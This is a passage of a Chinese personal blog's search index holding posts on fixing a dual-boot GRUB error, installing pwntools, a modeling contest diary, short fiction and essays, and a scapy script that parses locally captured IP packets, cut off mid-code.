<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>双系统安装过程中遇到的问题</title>
      <link href="/2021/03/11/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/03/11/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="电脑环境"><a href="#电脑环境" class="headerlink" title="电脑环境"></a>电脑环境</h3><p>HP，在固态下有win10系统，希望在机械硬盘下分配100G安装Ubuntu20.04系统</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>HP F9启动设备选择菜单  F10进入BIOS</p><p>基本步骤安装参考链接设置</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>安装成功后启动Ubuntu。</p><p>但是报错<code>minimal BASH like line editing is supported</code></p><p><img src="/2021/03/11/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>Windows所安装在的SSD是MBR引导分区，所以另外安装ubutnu系统时还要自己分区，如果把引导分区选在SSD上，那开机就直接进入ubuntu系统. 此时ubuntu系统只剩下引导程序，其他部分都已经被格式化删除掉了，导致了这个问题。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul><li><p>键入<code>exit</code>进入系统选择菜单，初次可行 但是有的时候会出问题。</p></li><li><p>在开机时按F9，在该界面弹出前进入系统选择菜单。</p></li></ul><p>前两种方法虽然确实能进入系统，但是还是没有解决GRUB缺失的问题。</p><p>下面给出解决办法，重装GRUB</p><ol><li><p>在开机时键入F9进入Ubuntu系统</p></li><li><p>安装修复工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:yannubuntu/boot-repair</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install boot-repair</span><br></pre></td></tr></table></figure></li><li><p>安装好boot-repair后命令行打开</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot-repair &amp;</span><br></pre></td></tr></table></figure></li><li><p>采用<code>recommended repair</code>模式修复，修复结束后重启即可</p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://zoyi14.smartapps.cn/pages/note/index?oauthType=search&amp;slug=54d9a3a695cc&amp;_swebfr=1">https://zoyi14.smartapps.cn/pages/note/index?oauthType=search&amp;slug=54d9a3a695cc&amp;_swebfr=1</a></p><p><a href="https://blog.csdn.net/opencv_learner/article/details/93589047">https://blog.csdn.net/opencv_learner/article/details/93589047</a></p><p><a href="https://itsfoss.com/fix-minimal-bash-line-editing-supported-grub-error-linux/">https://itsfoss.com/fix-minimal-bash-line-editing-supported-grub-error-linux/</a></p><p><a href="https://www.cnblogs.com/flyinggod/p/12886707.html">https://www.cnblogs.com/flyinggod/p/12886707.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笼中鸟</title>
      <link href="/2021/03/06/%E7%AC%BC%E4%B8%AD%E9%B8%9F/"/>
      <url>/2021/03/06/%E7%AC%BC%E4%B8%AD%E9%B8%9F/</url>
      
        <content type="html"><![CDATA[<p>在他千番的哀求下，那几个长官总算是答应他上前线去了。</p><p>这可真是太棒了！他将会用子弹打穿那些魔鬼的头，就像他小时候用弹弓打鸟一样，一打一个准，绝不会给它们机会逃跑。</p><p>坐在通往前线的火车上，他仿佛看见自己拿着老式毛瑟枪打的那些敌人哭喊着求饶，或许明天别人就该叫他“尊敬的将军阁下”了。那可真是太美妙了。</p><p>他极度向往战场，向往那鲜血的味道，那猛烈的炮火在他听来就是美妙的交响乐。战争意味着机会，尤其是对他这种下层人而言，这是一个成为上等人的机会，也许是他这辈子唯一一个。</p><p>但是，他得不到这个机会。他太过瘦弱了，没人瞧得起他，像他这样的人是没有机会上战场的，除非前线实在是没有人了，他只能待在电报机前接受总部发来的电报，这是前线的规矩。</p><p>无论他多么不情愿也没用，没人会在乎这个瘦弱的小家伙，他最后被“请”进了一间房间，尽管他抗争过，可也他的命运也不会改变。这个房间只有电报机和抄报纸，满是油墨的味道，没有刀，也没有枪，很难想象在前线会有这样一个安静的地方。他讨厌这里，讨厌这种气味，讨厌每个人都在低着头只做着自己的任务。</p><p>但他无法拒接，这是任务，难以反抗，他忍住内心的厌恶做了一天、两天。</p><p>在第三天，他终于忍不住了，他快要发疯了，内心对于战场的渴望早已压抑不住。“给我枪！给我枪！让我上战场！我要让那些敌人尝尝我的厉害！”他嘶嚎着，咆哮着。可没有人理他，每个人都在做自己的任务，仿佛没有听见他的叫喊。</p><p>一连数日，他都如此，像个疯子一样大喊大叫，他要将自己的要求同每一个人说，可所有人都在做自己的事，没人理他，没人管他，也没人制止他。他们知道如何应对这样的人，仿佛他们遇到过很多像他这样的人。</p><p>他彻底放弃了。</p><p>他知道自己被困在这里出不去了，就像是一只笼中鸟，他再也摸不到那枪杆，再也感受不到大炮那温暖的炮膛，他只能像这些人一样每天做着一样无聊且枯燥的事，他只能待在这个安静、远离战场的鸟笼中。</p><p>他坐了下来，一坐就是三年，人们称呼他为“尊敬的先生阁下”，他每天接收电报，然后发送电报，像个傻子先生，可他也不发脾气了，好像一切本该是这样。</p><p>这场仗把前线的士兵打掉了一批又一批，终于有一天，战场上的士兵不够了，当他的上司询问他是否要上战场时，他不假思索的把握住了这个机会。机会又一次降临，他本以为自己应该会很激动，可他却咋么也开心不起来。</p><p>他已经彻彻底底成为了一只笼中鸟，一只忘记他初衷的笼中鸟，一只沉溺于安逸生活的笼中鸟。</p><p>他摸到了枪，他站在战场上，他听到了猛烈的炮火声，一切都那么真实，真实的像梦境，可他再也提不起原来的兴趣，他已经完完全全不再是原来那个他了。</p><p>他强迫自己燃起曾经的热情，他努力使自己有来时的勇气，可一切都做不到，这与他来时不同了。</p><p>鲜血淋漓，炮火轰鸣，他看见一个接着一个同伴倒下，也许下一个就是他，这是死亡的号角在吹响。</p><p>笼中鸟就算脱离了牢笼，它的心也被锁在笼子里了。</p><p>他想起了昔日的梦想，自己如愿站在战场，可一切都变了，这不是现在的他想要的，但这确确实实是过去的他所追求的。</p><p>他疯了，彻底疯了，他举起枪，冲向炮火，仿佛双眼已被蒙蔽。</p><p>他死了，他被炸死了，身体被炸的四分五裂，可依旧没有人在意，就像他来时那样。一切都回不去了，就像他的现在与过去。</p>]]></content>
      
      
      <categories>
          
          <category> 随便写点东西 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu下搭建pwn环境</title>
      <link href="/2021/02/25/%E5%9C%A8Ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
      <url>/2021/02/25/%E5%9C%A8Ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>在Ubuntu20.0.4下安装pwntools</p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>备份源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</span><br></pre></td></tr></table></figure><p>更换源 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>删除上述文件全部内容，添加阿里源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>更新软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装pip3</span></span><br><span class="line">sudo apt install python3-pip</span><br><span class="line"><span class="comment">#升级pip3</span></span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line"><span class="comment">#安装pythondev</span></span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line">pip3 install setuptools</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><ol><li><code>python test.py</code>报错<code>No module named pwn</code>    应采用<code>python3</code></li><li>构造<code>payload</code>时采用<code>p64</code>函数在<code>python2</code>下可以通过编译 但<code>python3</code>报错<code>TypeError</code> 使用<code>str()</code>强制转化或者<code>.decode(&quot;Ascii&quot;)</code>均有问题 应采用<code>p64(xxx).decode(&quot;iso-8859-1&quot;)</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大道至简</title>
      <link href="/2021/02/16/%E5%A4%A7%E9%81%93%E8%87%B3%E7%AE%80/"/>
      <url>/2021/02/16/%E5%A4%A7%E9%81%93%E8%87%B3%E7%AE%80/</url>
      
        <content type="html"><![CDATA[<p>万物之始，大道至简，衍化为繁。</p><p>我想，倒也不只于万物之始，就是现在，大道也依旧至简。</p><p>至简不是一种简单，是简明、简约，是能让人忽然洞悉的。或者说，它具有纯粹性，它有一种纯粹的，直观的美。</p><p>$E=mc^2,e^{i\pi}+1=0$……物理、数学的公式是至简的，因为它们本就是在探寻世界的基本法则。</p><p>人类社会也是至简的，生与死两种状态，但其中所蕴含的却是无限的内容。</p><p>宇宙万物更是如此，一个奇点引发爆炸，无尽的法则被高度压缩到一个点，至真至简。宇宙膨胀，大道分散于世界，可根源还是不变，道被分解为各种粒子，在强弱作用力的作用下结合成为各种物质。化与归，本就是一体。</p><p>所以，归根到底，还是四个字，大道至简。</p><p>那为什么大道是至简的？因为它的纯粹性，它舍弃了所有不必要的”繁复“，只保留了最为“纯粹”的内容。那些揭示规律的公式是经过不断化简得来的，社会的本质是在除去其上繁芜的杂草后所呈现的，宇宙则是在时间的沉淀后将大道化为澄清的。</p><p>大道至简，衍化为繁。真理被藏于万物的运行法则中，粒子之间的作用产生了无穷无尽的新事物。衍化使其内容更加丰富，但其本质却变得模糊不清了。</p><p>而随着时间的推移，繁又会归于至简。生命的诞生到消亡，即是大道衍变的缩影，新生的事物与外物建立联系，再到一切的消失。将个体投射到整个社会，其实可以发现人生的许多事，简单被化为复杂都是人为的结果啊！</p><p>在从整个社会来看，繁杂的一切向着简单的“0”“1”转变，信息的至简大道就是“0”“1”，两个数字代表无数的状态，它存储着过去，也承载着未来。一切故事压缩与“0””1“，万物走向数字化。大道重回至简，可与先前倒也不同。先前是自然的至简法则，而现在在人为的加工后，是人类社会的至简法则。</p><p>社会的发展，即是伟大的人们引导自然法则为己用的结果，他们无法直视至简的大道，但基于繁芜的自然大道，他们领悟了自我的至简大道。</p>]]></content>
      
      
      <categories>
          
          <category> 随便写点东西 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>美赛总结</title>
      <link href="/2021/02/10/%E7%BE%8E%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/10/%E7%BE%8E%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>昨天结束了为期四天的美赛生活，在此写一篇文章，记录一下这几天的生活，做一个小的总结。</p><h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2><h3 id="1-25-1-27"><a href="#1-25-1-27" class="headerlink" title="1.25-1.27"></a>1.25-1.27</h3><p>回到家已经是1.25了，本来是想自己好好做一下LaTex的模板，但接下来的安排已经很紧迫了，就在GitHub上找了一个不错的，稍微改一下就拿来用了。接下来几天就是过一遍《机器学习实战》，找一些建模相关的资料。</p><h3 id="1-28-1-31"><a href="#1-28-1-31" class="headerlink" title="1.28-1.31"></a>1.28-1.31</h3><p>在家建模整个的状态肯定不如在学校，线上的环境也难以达到线下配合的效果。于是，在这几天我们自己练了2020年美赛的题目。选题阶段，看了一遍，感觉其实也都能写。但我希望这次练习的选择与今年美赛的选择基本一致。今年C题的压缩文件已经提前发了，从其庞大的数据量来看，我们怕是也很难做好。于是，一改我们最为擅长的数据分析题，最后选了E题。当时想，每年的E题都是环境相关，那就专攻这方面吧，只要比赛的E不是非常难就选E。</p><p>四天的练习时间，三天写完论文，一天改论文，时间上比国赛宽裕的多。论文写作方面可能提升的不多，但这四天对我整个状态的影响还是比较大的，开始是真不想写论文，毫无动力，写完之后的状态就好很多了，又重新燃起了对建模的那种激情。</p><p>这次的联系主要目的还是注重在这次写作过程中发现问题，避免其在比赛期间发生。</p><ul><li>协助方面，在GitHub上建了个仓库，用git协助的方式还是不错的，没有出现什么问题。</li><li>绘图方面，Tableau在练习过程中发挥的作用很大，应该可以作为比赛期间的主要绘图软件使用。</li><li>讨论方面，这次发现整个还是缺少讨论，每个人做一点，写一点论文，最后拼凑出来的论文缺少连贯性。讨论的加强、持续的沟通需要在比赛的时候尤其注意。更多的讨论可以避免时间的浪费，线上的协助对其他人的状态都不了解，所以还是需要讨论以及分享来实现自我监督。</li><li>时间安排方面，早上8.-11.，下午1.30-5.晚上6.30-10.，时间还是非常充裕的。这次练习浪费的时间其实不少，在比赛期间可以投入更多时间。</li></ul><h3 id="2-1-2-4"><a href="#2-1-2-4" class="headerlink" title="2.1-2.4"></a>2.1-2.4</h3><p>这几天的主要任务是总结。因为之前写过19年20年的论文，这次就看两年E题的O奖论文，白天看论文，晚上分享总结。写完后会过来看，这个看论文的阶段对我们写作的帮助非常之大，并非论文写作的水平有所提供，而是对优秀论文应该具备哪些要素有了认知。最后我们将以下几点记录在<a href="https://github.com/gorgeousdays/MCM-Note">MCM-Note</a>中，作为比赛的参考。</p><ul><li>记录一些易犯的错误,一些重要的点。在比赛期间可以注意。</li><li>整理数据网站。写论文需要看大量的论文，美赛也需要自己找数据。之前积累了不少数据网站，现在主要是对它们的内容进行整理，以便在比赛时可以更快找到需要的资源。</li><li>修改论文模板，在看了优秀论文后，要总体调整论文格式，从论文中也可以借鉴到一些句式。</li><li>建模方法的整理。</li><li>使用软件的整理。</li></ul><p>就我们看的几篇O奖论文，论文中的一些流程图都是逻辑清晰且美观的，在这几天我也学习了绘制这类逻辑图、流程图。</p><h2 id="比赛期间"><a href="#比赛期间" class="headerlink" title="比赛期间"></a>比赛期间</h2><h3 id="2-5-2-9"><a href="#2-5-2-9" class="headerlink" title="2.5-2.9"></a>2.5-2.9</h3><p>比赛时间</p><h4 id="2-5"><a href="#2-5" class="headerlink" title="2.5"></a>2.5</h4><p>第一天上午6.发题目，我们当时直接看E题了，感觉题目还可以，别的题目也没看，就选E题了。之后是找论文找看论文，理解题目，每隔一小时讨论一次。感觉题目是越理解越不懂，food system确实好做，这样的概念网上有很多论文，但因为这个系统太过庞大了，我们很难简单的将其讲清楚。我的想法是再看一点论文，队友那边第一题已经有一些想法了，他们就先往下写了。到下午，我把我搜集的网站上看到一些东西基本都整理完了，从没有一次连着看过这么多论文，还都是英文。我对food system有了一定的理解，但正是因为看的太多，且也不是非常仔细地全部理解，就感觉这题还是很难写。我有很多想法，很多别人的想法，但是很难将其串联在一起形成自己得的想法，再加上这个概念太过庞大，很难将其通过几个公式、几个方面进行阐述，更多还是分析为主。</p><p>优化两个方面并与之前的系统对比，然后预测发生时间。由于存在对比，那就先构建一个评价模型，因为存在优化，那就深入讨论两个方面设定优化系数，预测时间那我们就采用时间需序列。</p><p>第一天晚上做到了11.多，第一问的模型也做了个大概，当时要我要做两个优化方面的讨论、晚上只做了一个但是太累了也没继续做了，我这边的进度还是稍微慢一点了。</p><h4 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h4><p>早上5.多起来写，赶在讨论之前将我这边的工作基本做完。整个上午我就是把第一问全部整合，队友往下推进第二问。下午就一起第二问，但是对收益成本的理解还是定不下来，期间模型也建了不少，但是就是由于food system这个庞大的概念，始终都定不下要用什么模型，最后还是我这边建立一个Benefit-Cost Model，虽然还是存在很多问题，但其他方法也都不太像，这个起码还是可是往下推进了。到晚上，我这边第二问还差一点，队友第三问基本做好，另一位队友将这些模型串联起来。进度还是ok的。</p><h4 id="2-7"><a href="#2-7" class="headerlink" title="2.7"></a>2.7</h4><p>上午我完成第二问，第四问队友那边也有思路了。我这边接下来就是做一些流程图，p图，美化图片。在晚上的时候基本的论文已经出来了，也就剩下摘要部分、符号说明等和一些图片要改了。三天差不多写完+一天改论文也是与预期的差不多。晚上我这边基本没任务就早点睡觉了，队友那边负责把论文的语法错误做纠正。</p><h4 id="2-8"><a href="#2-8" class="headerlink" title="2.8"></a>2.8</h4><p>上午6.起，把队友昨晚整理的语法错误修正，把参考文献标注到论文，这在讨论之前我基本也都做好了。白天继续改图、改论文、把一些没写的地方写下。每题基本都好了，但是题目之间的模型还缺少一点联系，就没有一个逻辑上的推进性，而我们看的优秀论文在推进上都是很紧密的，白天主要还是为模型建立联系，尤其是第一问，做的时候考虑的还是太少。做了灵敏度分析晚上写摘要改摘要。一起过一遍改一些问题，下来后每个人各自看论文找问题。</p><h4 id="2-9"><a href="#2-9" class="headerlink" title="2.9"></a>2.9</h4><p>上午6.30，把昨天找的问题修改一下，大概把文章过一遍。7.30，交论文下班。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次美赛的论文大概是我们这么多篇论文下来最好的一篇了，前期的准备也算比较充足，比赛期间虽然也有不少问题，比如git使用的问题一度导致论文版本错误，又比如在第二问模型上长时间难有进展，但所幸最后做完了，而且做的感觉也还行。</p><p>比完国赛后，我想继续去数学建模，但比完美赛后，我觉得我的建模之旅应该到此为止了。不管结果如何，明年应该也是不会再次参加建模了，因为付出的时间代价太大了，校赛、国赛培训、美赛培训。明年再次参加也许也能拿到好的奖，但是花费时间太多了，而且长进确实也不会有今年那么大，在专业能力上的提升也不多。还是希望这次的美赛能有一个比较好的结果吧。</p><p>不管咋么说，也是结束了。三个人的比赛，沟通是很重要的，最后感谢一起陪伴的队友，感谢老师的指导，也感谢自己的付出。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈欲望</title>
      <link href="/2021/02/02/%E8%B0%88%E6%AC%B2%E6%9C%9B/"/>
      <url>/2021/02/02/%E8%B0%88%E6%AC%B2%E6%9C%9B/</url>
      
        <content type="html"><![CDATA[<p>什么才是我们真正想要的东西呢？</p><p>在年轻的时候，自命不凡的我们想要地位、想要金钱、想要出人头地。当我们过上富裕的生活，摆脱996的日常的时候，便开始追求身体的健康……</p><p>可人生哪有十全十美啊，想要的不一定会得到，就算拥有也可能会失去。拥有了富贵却也失去了对生活的享受，有了美好的未来却又花费了宝贵的青春。可就算是完美了呢，就算拥有了一切，我们会知足的认为一切就够了吗？也未必，患得患失，有得有失，而欲望不止。</p><p>谈到欲望，就不能不谈满足。因为不满足，所以欲望不止。</p><p>在没有实现目标之前，一切都是足够的，可达到了却也不满足于此。原来生活在温饱线下的人会仅仅满足与吃饱穿暖吗？不，他们必然会奔向小康，会有更多的诉求。他们会很不知足，会很贪心，简直就是贪得无厌，会去追求更多。</p><p>这就是欲望所带来的，欲望之火生生不息，也正因为此，社会才会发展。社会的前进不是人民的勤劳，是人民的不满足。正是由于这样的“贪心”，每个人才能过得更好。</p><p>而当下，佛系思想生长，欲望遭到侵蚀。人们满足了吗？很难说。但确实，他们不追求了，他们随遇而安。欲望与满足脱钩，时代的进步开始停滞。欲望是社会的永动机，当一个人不追求的时候，社会会抛弃他，很难想象当一群人不追求的时候会发生什么，是他们被抛弃还是社会被抛弃。</p><p>从这种角度来看欲望，它确实推动了社会的进步。可人民对欲望的追求有需要考虑自我与时代的关系，要用正确的方法。很多人的欲望太强烈了，强到突破了法律的边界，他们为了达成目标不择手段，强抢，掠夺，无所不用其极。于是他们被法律制裁，被时代碾压。掌控不了欲望的人被欲望所掌控。</p><p>当一群人开始追求欲望时，社会便有了一种“奋斗”的氛围。在这种奋斗的氛围下，人们很容易忘掉自己到底需要什么，贫穷到富裕，失去到拥有，我们在欲望的推动下去找寻、去追求更多，只知道追求的是美好的，确忘了何时是终点，只知前进，永不停止。</p><p>在欲望的滚轮下，时代向前推进，有追求到忙到没时间停下来看看自己到底走到哪了，有没有超过自己最初界定的目标，超过了多少。</p><p>为什么有时候什么都有了却还在追求，却还有欲望，却还在抱怨拥有太少，到底是为什么呢？</p><p>也许这只是一种感觉，当我们拥有了追求的东西，这种感觉便会失去。而欲望则是点燃这种感觉的火把。也就是为了这种感觉，人们不断向前追求。</p>]]></content>
      
      
      <categories>
          
          <category> 随便写点东西 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈平均</title>
      <link href="/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/"/>
      <url>/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/</url>
      
        <content type="html"><![CDATA[<p>​         在网上常看到这样一个段子“我、马云、马化腾、王健林资产平均几百亿”。</p><p>​         想想还是挺激动的，“我”一个普通人倒也混进这个平均几百亿的圈子里。可其实，有“我”没“我”倒也一样。单就资产而言，“我”可连他们的零头都没有，显然这“我”是被平均了。</p><p>​         生活中倒也不乏这样的事情，大多数的人都被平均过。比如全省人均工资多少，全国人均绿化面积多少。少数的高收入的人群平均了大多数低收入的人群，东部的绿化面积平均了西部。人均的绿化面积在西部想是体会不到，但在东部地区却又溢出了。</p><p>​        一些公司打广告往往也如此，平均月薪多高多高，可进去之后才发现，几个高管月薪上万，而普通的员工却也只有几千，平均月薪确实高，可都是享受不到的。</p><p>​        为什么经常会有平均这个概念呢？为什么很多新闻、报纸都拿平均说事呢？</p><p>​        好像有过这样一个段子，“伊万科夫，你为什么要读真理报？”“我读真理报知道我是幸福的。”同样，平均的高水平使低水平的人或者地区充满向往，仿佛自己也将达到这一水平。大多数被平均了，生活水平被抬高了，整个社会也将更幸福了。那些被平的人呢也无法诉苦，鲜明的数据不给人们机会辩驳，大家都实现了，为什么你没有呢？那人们还是得自己找原因啊。自己不努力还是不会谋划，想是总能找到原因。</p><p>​         这样的平均也确有好处，人们意识到自身的差距，便开始往平均的线上走，也就带动了整个社会的发展，可到那时候社会的平均线还会上涨吗？如果还会上涨，那大多数人就是追着社会的平均水平过日子了，跟着它后面走，却很难超越。那如果不会呢，也就是社会的平均水平没变，这有上去的就有下来的，那谁下来呢，是那些被平均的人在内卷还是平均别人的人被被平均者打到呢？</p><p>​        大多数都是被平均的，那么是谁平均了他们呢？也就是开头谈的马云、王健林等人，可他们自身也无意参与这种平均啊，是别人叫他们给平均了。这些人以前反对农民的平均主义思想，咋么现在又开始平均了呢？</p><p>​        为什么呢？因为有用，要是肯定农民的平均主义思想，那自己的东西可不是要被分完了吗？要是现在不用平均的概念，那大家不是看不见美好生活了，那还不乱了套？</p><p>​        平均倒也不应只是被书写在纸上的数据，还是要落到实处。其实，被平均只是一分安慰，但也可以拉升我们的希望啊！</p>]]></content>
      
      
      <categories>
          
          <category> 随便写点东西 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>socket初探</title>
      <link href="/2021/01/07/socket%E5%88%9D%E6%8E%A2/"/>
      <url>/2021/01/07/socket%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>为了实现以下功能</p><blockquote><p>捕获本机网卡的IP包，对捕获的IP包进行解析。<br>要求必须输出以下字段：版本号、总长度、标志位、片偏移、协议、源地址和目的地址。</p></blockquote><p>我第一反应就是Python应当有这么一个库可以直接调用，那问题就解决了，通过scapy的确可以实现，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过scapy来获取本机对应网卡的IP报文</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_callback</span>(<span class="params">packet</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> (packet[<span class="number">6</span>].name == <span class="string">&#x27;IP&#x27;</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.version)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ihl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.tos)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.len)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.id)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.flags)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.frag)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ttl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.proto)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.chksum)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.src)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.dst)</span><br><span class="line">            a.append(temp)</span><br><span class="line">            print(temp)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">filterstr=<span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="comment">#关于sniff的prn参数  指定回调函数，每当一个符合filter的报文被探测到时，就会执行回调函数</span></span><br><span class="line"><span class="comment">#iface参数 用来指定要在哪个网络接口上进行抓包 如若不指定即所有网络接口</span></span><br><span class="line"><span class="comment"># count指定最多嗅探多少个报文（是指符合filter条件的报文，而非所有报文）</span></span><br><span class="line">sniff(filter=filterstr,prn=pack_callback, iface=<span class="string">&#x27; &#x27;</span>, count=<span 